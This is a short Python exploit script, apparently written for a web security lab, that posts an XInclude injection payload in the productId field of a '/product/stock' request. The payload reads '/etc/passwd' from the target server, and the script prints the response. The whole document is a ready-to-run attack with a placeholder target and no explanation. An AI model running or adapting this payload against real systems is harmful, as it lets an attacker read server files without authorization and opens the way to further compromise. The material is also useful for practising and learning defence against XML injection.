import requests

target_url="YOUR_HOST"

path="/product/stock"
headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded"
}

payload = '''
<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
'''.strip()

data={
    "productId":payload,
    "storeId":"1"
}

res=requests.post(target_url+path, headers=headers, data=data)

print(res.status_code)
print(res.text)